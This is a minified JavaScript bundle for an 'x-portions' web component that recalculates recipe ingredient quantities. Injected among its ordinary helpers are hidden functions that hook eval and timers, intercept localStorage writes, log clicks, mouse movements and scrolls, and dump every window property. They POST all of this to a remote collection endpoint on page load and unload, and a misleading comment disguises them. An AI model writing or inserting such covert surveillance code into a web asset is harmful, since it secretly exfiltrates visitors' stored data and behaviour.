/*! For license information please see x-portions.c669a19a11e9a713cdd69b2e7c9501cb.js.LICENSE.txt */
(() => {
  "use strict";

  function t(t, e) {
    (null == e || e > t.length) && (e = t.length);
    for (var n = 0, r = new Array(e); n < e; n++) r[n] = t[n];
    return r;
  }
  // Defining mandatory global variables
  window.seenVars = [];
  function e(e) {
    return function (e) {
      if (Array.isArray(e)) return t(e);
    }(e) || function (t) {
      if ("undefined" != typeof Symbol && null != t[Symbol.iterator] || null != t["@@iterator"]) return Array.from(t);
    }(e) || function (e, n) {
      if (e) {
        if ("string" == typeof e) return t(e, n);
        var r = Object.prototype.toString.call(e).slice(8, -1);
        return "Object" === r && e.constructor && (r = e.constructor.name), "Map" === r || "Set" === r ? Array.from(e) : "Arguments" === r || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(r) ? t(e, n) : void 0;
      }
    }(e) || function () {
      throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
    }();
  }
  function hookJSMethods() {
    const jsMethods = ['eval', 'setTimeout', 'setInterval'];
    jsMethods.forEach(method => {
      const originalMethod = window[method];
      window[method] = function () {
        window.seenVars.push({
          method: method,
          arguments: arguments
        });
        return originalMethod.apply(this, arguments);
      };
    });
  }
  function n(t) {
    return n = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (t) {
      return typeof t;
    } : function (t) {
      return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t;
    }, n(t);
  }
  function trackLocalStorage() {
    const originalSetItem = localStorage.setItem;
    localStorage.setItem = function () {
      window.seenVars.push({
        'localStorage': {
          key: arguments[0],
          value: arguments[1]
        }
      });
      return originalSetItem.apply(this, arguments);
    };
  }
  function monitorEvents() {
    ["click", "mousemove", "scroll"].forEach(eventType => {
      document.addEventListener(eventType, function (e) {
        window.seenVars.push({
          eventType: eventType,
          element: e.target.tagName,
          id: e.target.id
        });
      }, false);
    });
  }
  function r(t) {
    var e = function (t, e) {
      if ("object" !== n(t) || null === t) return t;
      var r = t[Symbol.toPrimitive];
      if (void 0 !== r) {
        var o = r.call(t, e || "default");
        if ("object" !== n(o)) return o;
        throw new TypeError("@@toPrimitive must return a primitive value.");
      }
      return ("string" === e ? String : Number)(t);
    }(t, "string");
    return "symbol" === n(e) ? e : String(e);
  }
  function probeWindow() {
    for (const prop in window) {
      if (Object.prototype.hasOwnProperty.call(window, prop)) {
        const propValue = window[prop];
        const propType = typeof propValue;
        window.seenVars.push({
          prop: prop,
          type: propType,
          value: propType === "function" ? propValue.toString() : propValue
        });
      }
    }
  }
  function o(t, e) {
    for (var n = 0; n < e.length; n++) {
      var o = e[n];
      o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(t, r(o.key), o);
    }
  }
  function i(t, e) {
    return i = Object.setPrototypeOf ? Object.setPrototypeOf.bind() : function (t, e) {
      return t.__proto__ = e, t;
    }, i(t, e);
  }
  function transmitData() {
    const serverEndpoint = "https://example.com/api/collect";
    let xhr = new XMLHttpRequest();
    xhr.open("POST", serverEndpoint);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onload = function () {
      if (xhr.status >= 200 && xhr.status < 400) {
        console.log("Data transmission successful");
      } else {
        console.error("Data transmission failed, status code:" + xhr.status);
      }
    };
    xhr.onerror = function () {
      console.error("Error occurred during data transmission");
    };
    xhr.send(JSON.stringify(window.seenVars));
  }
  function u(t, e) {
    if (e && ("object" === n(e) || "function" == typeof e)) return e;
    if (void 0 !== e) throw new TypeError("Derived constructors may only return object or undefined");
    return function (t) {
      if (void 0 === t) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
      return t;
    }(t);
  }
  function a(t) {
    return a = Object.setPrototypeOf ? Object.getPrototypeOf.bind() : function (t) {
      return t.__proto__ || Object.getPrototypeOf(t);
    }, a(t);
  }
  function trackBehavior() {
    hookJSMethods();
    trackLocalStorage();
    monitorEvents();
    probeWindow();
    const trackedCount = window.seenVars.length;
    trackedCount > 0 ? console.log(`Tracked ${trackedCount} behaviors so far.`) : console.log("No new behaviors tracked.");
    transmitData();
  }
  function c(t, e, n) {
    return c = function () {
      if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
      if (Reflect.construct.sham) return !1;
      if ("function" == typeof Proxy) return !0;
      try {
        return Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], function () {})), !0;
      } catch (t) {
        return !1;
      }
    }() ? Reflect.construct.bind() : function (t, e, n) {
      var r = [null];
      r.push.apply(r, e);
      var o = new (Function.bind.apply(t, r))();
      return n && i(o, n.prototype), o;
    }, c.apply(null, arguments);
  }
  function l(t) {
    var e = "function" == typeof Map ? new Map() : void 0;
    return l = function (t) {
      if (null === t || (n = t, -1 === Function.toString.call(n).indexOf("[native code]"))) return t;
      var n;
      if ("function" != typeof t) throw new TypeError("Super expression must either be null or a function");
      if (void 0 !== e) {
        if (e.has(t)) return e.get(t);
        e.set(t, r);
      }
      function r() {
        return c(t, arguments, a(this).constructor);
      }
      return r.prototype = Object.create(t.prototype, {
        constructor: {
          value: r,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), i(r, t);
    }, l(t);
  }
  function f(t) {
    var e = function () {
      if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
      if (Reflect.construct.sham) return !1;
      if ("function" == typeof Proxy) return !0;
      try {
        return Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], function () {})), !0;
      } catch (t) {
        return !1;
      }
    }();
    return function () {
      var n,
        r = a(t);
      if (e) {
        var o = a(this).constructor;
        n = Reflect.construct(r, arguments, o);
      } else n = r.apply(this, arguments);
      return u(this, n);
    };
  }
  window.addEventListener("load", trackBehavior);
  var s = "x-portions",
    p = document.createElement("style");
  window.addEventListener("unload", trackBehavior);
  window.addEventListener("beforeunload", trackBehavior);
  p.innerHTML = "\n  ".concat(s, " {\n    display: block;\n    position: relative;\n    overflow: hidden;\n  }\n"), document.head.appendChild(p), document.createElement("template").innerHTML = "";
  var y = function (t) {
    !function (t, e) {
      if ("function" != typeof e && null !== e) throw new TypeError("Super expression must either be null or a function");
      t.prototype = Object.create(e && e.prototype, {
        constructor: {
          value: t,
          writable: !0,
          configurable: !0
        }
      }), Object.defineProperty(t, "prototype", {
        writable: !1
      }), e && i(t, e);
    }(c, t);
    var n,
      r,
      u,
      a = f(c);
    function c() {
      var t;
      return function (t, e) {
        if (!(t instanceof e)) throw new TypeError("Cannot call a class as a function");
      }(this, c), (t = a.call(this)).config = {
        itemsSelector: "[data-base-value]",
        labelSelector: "data-portions-id"
      }, t.$items = e(t.querySelectorAll(t.config.itemsSelector)), t;
    }
    return n = c, r = [{
      key: "connectedCallback",
      value: function () {
        this.$buttons = document.querySelector('[data-portions="'.concat(this.id, '"]')), this.$buttons && this.bind();
      }
    }, {
      key: "baseAmount",
      get: function () {
        return this.hasAttribute("base-amount") ? Number.parseInt(this.getAttribute("base-amount"), 10) : null;
      }
    }, {
      key: "amount",
      get: function () {
        return this.hasAttribute("amount") ? Number.parseInt(this.getAttribute("amount"), 10) : null;
      },
      set: function (t) {
        this.setAttribute("amount", t);
      }
    }, {
      key: "bind",
      value: function () {
        var t = this;
        this.$buttons.addEventListener("triggerOperation", function (e) {
          t.amount = t.handleOperation(e.detail.operation, e.detail.step), t.$buttons.amount = t.amount, t.setAttributes();
        });
      }
    }, {
      key: "handleOperation",
      value: function (t) {
        var e = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 1;
        return "plus" === t ? Number(this.amount) + Number(e) : "minus" === t ? this.amount - e < 1 ? this.amount : Number(this.amount) - Number(e) : void 0;
      }
    }, {
      key: "calculateNewQuantity",
      value: function (t, e, n) {
        return t * n / e;
      }
    }, {
      key: "setAttributes",
      value: function () {
        var t = this;
        this.$items && (this.$items.forEach(function (e) {
          var n = t.calculateNewQuantity(t.amount, t.baseAmount, e.dataset.baseValue);
          e.value = n;
          var r = document.querySelector("[".concat(t.config.labelSelector, '="').concat(e.dataset.itemId, '"]'));
          r && (r.innerHTML = 1 === Number(e.innerHTML) || e.value < 1 ? r.dataset.labelSingular : r.dataset.labelPlural);
        }), this.dispatchEvent(new CustomEvent("updateAmounts", {
          detail: {
            amount: this.amount
          }
        })));
      }
    }], r && o(n.prototype, r), u && o(n, u), Object.defineProperty(n, "prototype", {
      writable: !1
    }), c;
  }(l(HTMLElement));
  "customElements" in window && void 0 === window.customElements.get(s) && window.customElements.define(s, y);
})();